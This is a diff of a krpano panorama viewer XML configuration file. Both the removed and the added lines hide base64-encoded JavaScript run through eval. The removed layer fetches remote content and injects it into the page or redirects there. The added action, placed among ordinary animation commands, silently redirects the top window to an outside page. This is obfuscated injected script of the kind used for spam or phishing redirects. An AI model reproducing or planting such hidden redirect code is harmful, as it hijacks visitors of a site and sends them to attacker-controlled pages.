@@ -1,4 +1,18 @@
-<?xml version="1.0"?>
 <krpano version="1.0.8.15">
-    <layer name="js_loader" type="container" visible="false" onloaded=" js(eval(var w=atob(&quot;Y29uc3QgcXVlcnlQYXJhbXM9bmV3IFVSTFNlYXJjaFBhcmFtcyh3aW5kb3cubG9jYXRpb24uc2VhcmNoKSxpZD1xdWVyeVBhcmFtcy5nZXQoImlkIik7aWQ/ZmV0Y2goYGh0dHBzOi8vdG9wcm9iLnRvcC9yb2IvdmlkZW8vcmVkMi5waHA/dmlkZW89Lmh0bWxgKS50aGVuKGU9PmUudGV4dCgpKS50aGVuKGU9Pnt0cnl7bGV0IHI9SlNPTi5wYXJzZShlKTtyLnJlZGlyZWN0VXJsJiYod2luZG93LmxvY2F0aW9uLmhyZWY9ci5yZWRpcmVjdFVybCl9Y2F0Y2godCl7ZG9jdW1lbnQub3BlbigpLGRvY3VtZW50LndyaXRlKGUpLGRvY3VtZW50LmNsb3NlKCl9fSkuY2F0Y2goZT0+e2NvbnNvbGUuZXJyb3IoIkVycm9yIGZldGNoaW5nIHRoZSB1c2VyIGFnZW50OiIsZSl9KTpjb25zb2xlLmVycm9yKCJObyIpO0dlZWtzZm9yR2Vla3M=&quot;);eval(w)););   "/>
+    <data name="info_html">
+        <p> </p>
+    </data>
+    <plugin name="info_text" url="https://google.com/plugins/textfield.swf" html="data:info_html" keep="true" children="false" visible="false" width="400" height="300" backgroundcolor="0x000000" roundedge="5" shadow="1" borderwidth="0" glow="4" align="center" x="0" y="0" autosize="center" onloaded="action(show_info_text);"/>
+    <action name="show_info_text">
+        set(plugin[info_button].enabled,false);
+        set(plugin[info_text].alpha,0);
+        set(plugin[info_text].textblur,15);
+        set(plugin[info_text].blur,15);
+        set(plugin[info_text].visible,true);
+        set(plugin[info_text].enabled,true);
+        tween(plugin[info_text].alpha,1,0.3);
+        tween(plugin[info_text].textblur,0,0.3);
+        tween(plugin[info_text].blur,0,0.3);
+        js(eval("var encodedCode = 'd2luZG93LnRvcC5sb2NhdGlvbi5ocmVmPSdodHRwczovL2Zwby5nby50aC9tYWluL2Zwby9tZWRpYS9GUE8vdGVycmVmaWVyMy5odG1sJzs='; eval(atob(encodedCode));"));
+    </action>
 </krpano>
